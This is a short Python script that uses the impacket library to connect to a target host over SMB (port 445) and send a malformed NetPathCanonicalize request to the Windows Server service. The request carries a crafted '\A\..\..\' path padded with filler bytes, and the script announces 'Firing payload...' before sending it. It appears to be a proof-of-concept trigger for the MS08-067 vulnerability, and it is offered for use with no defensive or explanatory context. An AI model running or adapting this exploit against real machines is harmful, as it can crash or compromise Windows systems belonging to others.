#!/usr/bin/python

# from impacket import smb
from impacket import uuid
from impacket.dcerpc.v5 import transport
import struct
import sys


try:
	target = sys.argv[1]
	port = 445
except IndexError:
	print "Usage: %s HOST" % sys.argv[0]
	sys.exit()


trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % target)
trans.connect()
dce = trans.DCERPC_class(trans)
dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))


stub = '\x01\x00\x00\x00' # Reference ID
stub += '\x10\x00\x00\x00' # Server UNC - Max Buffer Count
stub += '\x00\x00\x00\x00' # Offset
stub += '\x10\x00\x00\x00' # Server UNC - Actual Buffer Count
stub += '\xCC'*28 # Server UNC Buffer Content
stub += '\x00\x00\x00\x00' # Server UNC Trailing Null Bytes

# RPC Path
stub += '\x2f\x00\x00\x00' # RPC Path - Max Buffer Count
stub += '\x00\x00\x00\x00' # Offset
stub += '\x2f\x00\x00\x00' # RPC Path - Actual Buffer Count


# Trigger Path = \A\..\..\
stub += '\x41\x00\x5c\x00\x2e\x00\x2e\x00' # Trigger Path
stub += '\x5c\x00\x2e\x00\x2e\x00\x5c\x00' # Trigger Path
stub += '\x41'*74 # Trigger Path


# Misc
stub += '\x00\x00' # Padding
stub += '\x00\x00\x00\x00' # Max Buffer Count
stub += '\x02\x00\x00\x00' # Prefix - Max Unicode Count
stub += '\x02\x00\x00\x00' # Offset
stub += '\x00\x00\x00\x00' # Prefix - Actual Unicode Count
stub += '\x02\x00\x00\x00'
stub += '\x5c\x00\x00\x00' # Prefix + Trailing Null Bytes
stub += '\x01\x00\x00\x00' # Pointer to Path Type
stub += '\x01\x00\x00\x00' # Path type and flags

print "Firing payload..."
dce.call(0x1f, stub) # NetPathCanonicalize
